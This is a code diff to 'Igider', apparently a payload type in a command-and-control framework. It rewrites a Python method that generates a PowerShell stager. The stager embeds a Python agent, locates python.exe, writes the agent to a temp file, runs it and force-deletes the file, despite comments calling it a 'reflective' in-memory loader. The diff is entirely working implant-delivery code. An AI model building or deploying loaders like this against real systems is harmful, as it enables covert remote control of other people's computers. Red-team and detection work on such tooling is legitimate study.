@@ -169,63 +169,56 @@ class Igider(PayloadType):
 
 
 
+
     def _create_powershell_loader(self, python_code: str) -> str:
         """Create PowerShell reflective loader for Python agent."""
-        import textwrap
-        
-        # Clean the Python code to ensure proper formatting
+        # Clean each line of the embedded Python code
         cleaned_python_code = '\n'.join(line.rstrip() for line in python_code.split('\n'))
 
-        # Use dedent to align the string to the left
-        powershell_loader = textwrap.dedent(f'''\
-            # PowerShell Reflective Python Loader
-            $pythonCode = @"
-    {cleaned_python_code}
-    "@
-
-            # Check for Python installation
-            $pythonPaths = @(
-                "$env:LOCALAPPDATA\\Programs\\Python\\*\\python.exe",
-                "$env:PROGRAMFILES\\Python*\\python.exe",
-                "$env:PROGRAMFILES(X86)\\Python*\\python.exe",
-                "python.exe"
-            )
-
-            $pythonExe = $null
-            foreach ($path in $pythonPaths) {{
-                try {{
-                    $resolved = Get-Command $path -ErrorAction SilentlyContinue
-                    if ($resolved) {{
-                        $pythonExe = $resolved.Source
-                        break
-                    }}
-                }} catch {{}}
-            }}
-
-            if (-not $pythonExe) {{
-                # Fallback: Try to download and run portable Python or use IronPython
-                Write-Host "Python not found, attempting alternative execution..."
-
-                # Alternative 1: Use built-in .NET to execute Python-like logic
-                Add-Type -AssemblyName System.Net.Http
-
-                # Alternative 2: Convert critical parts to PowerShell
-                # This would require translating the Python agent logic
-                exit 1
-            }}
-
-            # Execute Python code in memory
-            $tempFile = [System.IO.Path]::GetTempFileName() + ".py"
-            $pythonCode | Out-File -FilePath $tempFile -Encoding UTF8
-
-            try {{
-                & $pythonExe $tempFile
-            }} finally {{
-                Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
-            }}
-        ''')
+        # Build the PowerShell string with exact formatting — no indent issues
+        powershell_loader = (
+            '# PowerShell Reflective Python Loader\n'
+            '$pythonCode = @"\n'
+            f'{cleaned_python_code}\n'
+            '"@\n'
+            '\n'
+            '# Check for Python installation\n'
+            '$pythonPaths = @(\n'
+            '    "$env:LOCALAPPDATA\\Programs\\Python\\*\\python.exe",\n'
+            '    "$env:PROGRAMFILES\\Python*\\python.exe",\n'
+            '    "$env:PROGRAMFILES(X86)\\Python*\\python.exe",\n'
+            '    "python.exe"\n'
+            ')\n'
+            '\n'
+            '$pythonExe = $null\n'
+            'foreach ($path in $pythonPaths) {\n'
+            '    try {\n'
+            '        $resolved = Get-Command $path -ErrorAction SilentlyContinue\n'
+            '        if ($resolved) {\n'
+            '            $pythonExe = $resolved.Source\n'
+            '            break\n'
+            '        }\n'
+            '    } catch {}\n'
+            '}\n'
+            '\n'
+            'if (-not $pythonExe) {\n'
+            '    Write-Host "Python not found, attempting alternative execution..."\n'
+            '    Add-Type -AssemblyName System.Net.Http\n'
+            '    exit 1\n'
+            '}\n'
+            '\n'
+            '$tempFile = [System.IO.Path]::GetTempFileName() + ".py"\n'
+            '$pythonCode | Out-File -FilePath $tempFile -Encoding UTF8\n'
+            '\n'
+            'try {\n'
+            '    & $pythonExe $tempFile\n'
+            '} finally {\n'
+            '    Remove-Item $tempFile -Force -ErrorAction SilentlyContinue\n'
+            '}\n'
+        )
 
         return powershell_loader
+
 
     
 
